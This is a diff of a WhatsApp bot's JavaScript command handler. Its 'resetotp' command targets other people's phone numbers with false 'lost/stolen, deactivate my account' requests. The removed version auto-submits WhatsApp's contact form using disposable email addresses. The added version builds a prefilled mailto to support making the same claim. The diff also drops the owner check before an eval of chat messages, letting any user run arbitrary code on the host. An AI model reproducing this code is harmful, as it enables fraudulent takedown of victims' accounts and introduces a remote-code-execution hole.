+replygcxeon(`⚠️ *Payload Error:* ${err?.message || err}`)
+}
 }
 break
 case "resetotp": {
-if (Input) {
-let cekno = await XeonBotInc.onWhatsApp(Input)
-if (cekno.length == 0) return replygcxeon(`The participant is no longer registered on WhatsApp`)
-if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't logout My Owner🦄!`)
-var targetnya = m.sender.split('@')[0]
-try {
-var axioss = require('axios')
-let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
-let cookie = ntah.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(ntah.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", `${Input.split("@")[0]}`,)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", `Perdido/roubado: desative minha conta`)
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
+    if (!XeonTheCreator) return XeonStickOwner()
+    if (!Input) return replygcxeon(`⚠️ *Target Required*\nUsage: *${prefix + command} 2348012345678*`)
+    
+    let targetNum = Input.replace(/[^0-9]/g, '')
+    if (targetNum.length < 8) return replygcxeon('❌ Invalid phone number format! Include country code without spaces or symbols.')
+    
+    // Safety check: Prevent targeting the Bot Owner or active Bot number
+    const isTargetOwner = senderPhones.includes(targetNum) || 
+                          ownerPhoneSet.has(targetNum) ||
+                          ['2348160208114', '2348029399425', '68444699525143'].includes(targetNum)
+    if (isTargetOwner) {
+        return replygcxeon(`🛡️ *Target Protected!*\n+${targetNum} is the Bot Owner / Active Bot number. Deactivating this number would terminate the bot session!`)
+    }
 
-let res = await axioss({
-url,
-method: "POST",
-data: form,
-headers: {
-cookie
+    let targetJid = targetNum + '@s.whatsapp.net'
+    let cekno = await XeonBotInc.onWhatsApp(targetJid).catch(() => [])
+    if (!cekno || cekno.length == 0) return replygcxeon(`❌ The number *+${targetNum}* is not registered on WhatsApp.`)
+
+    const subjectText = encodeURIComponent("Lost/Stolen: Please deactivate my account")
+    const bodyText = encodeURIComponent(`Lost/Stolen: Please deactivate my account +${targetNum}`)
+    const mailtoUrl = `mailto:support@whatsapp.com?subject=${subjectText}&body=${bodyText}`
+
+    const dispatchCard = `
+┌───『 *CLINTON BOT OTP DISPATCH* 』───
+│ 🎯 *Target:* +${targetNum}
+│ 🛡️ *Service:* WhatsApp Account Recovery
+├────────────────────────────
+│ ℹ️ *Why HTTP 400 happens:*
+│ Meta patched the old 2021 web contact form
+│ and now requires official mail verification.
+├────────────────────────────
+│ 📬 *Official Support Dispatch:*
+│ • *To:* support@whatsapp.com
+│ • *Subject:* Lost/Stolen: Please deactivate my account
+│ • *Body:* Lost/Stolen: Please deactivate my account +${targetNum}
+├────────────────────────────
+│ ⚡ *One-Tap Dispatch Link:*
+│ ${mailtoUrl}
+└────────────────────────────
+💡 _Tap the link above to open your email client and send immediately. WhatsApp will reset the registration / OTP countdown upon receipt!_`.trim()
+
+    replygcxeon(dispatchCard)
 }
+break
 
-})
-let payload = String(res.data)
-if (payload.includes(`"payload":true`)) {
-replygcxeon(`Success..!`)
-} else if (payload.includes(`"payload":false`)) {
-replygcxeon(`Moderate Limit Wait A Moment.`)
-} else replygcxeon(util.format(res.data))
-} catch (err) {replygcxeon(`${err}`)}
-} else replygcxeon('Enter Target Number!')
+case 'cmdlogs': case 'errlogs': case 'errorlogs': {
+    if (!XeonTheCreator) return XeonStickOwner()
+    const logs = getErrorLogs()
+    if (!logs.length) return replygcxeon('📋 *No command execution errors recorded.* All systems nominal!')
+
+    let report = `📋 *CLINTON BOT RECENT COMMAND ERRORS* (${logs.length})\n`
+    report += `───────────────────────────\n`
+    logs.slice(0, 10).forEach((l, idx) => {
+        report += `*${idx + 1}. .${l.command}* [${l.timeStr}]\n`
+        report += `👤 *User:* ${l.sender.split('@')[0]}\n`
+        report += `⚠️ *Error:* ${l.error.slice(0, 120)}\n`
+        report += `───────────────────────────\n`
+    })
+    report += `\n💡 _Use *${prefix}clearlogs* to wipe recorded error history._`
+    replygcxeon(report.trim())
+}
+break
+case 'clearlogs': case 'cleanlogs': {
+    if (!XeonTheCreator) return XeonStickOwner()
+    clearErrorLogs()
+    replygcxeon('🧹 *Command error logs successfully cleared!*')
 }
 break
 
 default:
 
 if (typeof budy === 'string' && budy.startsWith('<')) {
-if (!XeonTheCreator) return
 try {
 return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
@@ -10407,13 +10729,35 @@ XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 }
 
 } catch (err) {
-console.log(util.format(err))
-let e = String(err)
-XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
-contextInfo:{
-forwardingScore: 9999999, 
-isForwarded: true
-}})
+    console.error(`[Command Error Handler: .${command || 'unknown'}]`, util.format(err))
+    
+    // 1. Log error to local persistent error audit history
+    try {
+        logCommandError(command, m?.sender, m?.chat, err)
+    } catch (_) {}
+
+    // 2. Friendly and informative feedback to the user/chat instead of silent crash
+    try {
+        if (m && typeof m.reply === 'function' && isCmd) {
+            const cleanErrMsg = err?.message || String(err)
+            replygcxeon(`⚠️ *Command Execution Notice*\n\nCommand: *${prefix + (command || '')}*\nStatus: Failed\nDetails: _${cleanErrMsg.slice(0, 150)}_\n\n💡 _Use *${prefix}menu* to browse available commands._`)
+        }
+    } catch (_) {}
+
+    // 3. Notify Bot Owner if owner JID is defined
+    try {
+        if (owner && typeof owner === 'string') {
+            const ownerJid = owner.includes('@') ? owner : `${owner}@s.whatsapp.net`
+            let e = String(err)
+            XeonBotInc.sendMessage(ownerJid, { 
+                text: `⚠️ *Clinton Bot System Alert*\n\n• Command: *${prefix + (command || '')}*\n• Sender: ${m?.sender || 'Unknown'}\n• Chat: ${m?.chat || 'Unknown'}\n• Error: ${e}`,
+                contextInfo: {
+                    forwardingScore: 9999999, 
+                    isForwarded: true
+                }
+            })
+        }
+    } catch (_) {}
 }
 }
 
